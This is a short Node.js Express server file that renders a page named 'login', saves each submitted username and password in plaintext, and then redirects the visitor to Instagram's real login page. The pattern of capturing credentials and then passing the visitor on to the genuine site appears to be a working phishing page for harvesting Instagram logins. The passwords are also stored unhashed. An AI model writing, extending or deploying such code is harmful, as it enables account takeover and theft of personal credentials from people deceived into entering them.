const express = require('express');
const app = express();
const userModel = require('./models/user'); // Ensure the user model is correctly implemented
const cookieParser = require('cookie-parser');
const path = require('path');

// Set view engine and middlewares
app.set('view engine', 'ejs');
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cookieParser());

// Route to render the homepage
app.get('/', (req, res) => {
    res.render('login');
});

// Route to register a new user
app.post('/register', async (req, res) => {
    const { username, password } = req.body;

    try {
        // Create and save new user
        const newUser = await userModel.create({ username, password });

        // Redirect to the feed after successful registration
        res.redirect('https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav');
    } catch (error) {
        console.error(error);
        res.status(500).send('An error occurred while registering the user.');
    }
});

// Route to render the feed
app.get('/feed', (req, res) => {
    res.render('feed');
});

// Route to handle logout (no logic since there's no session management)
app.get('/logout', (req, res) => {
    res.redirect('/');
});

// Start the server
app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
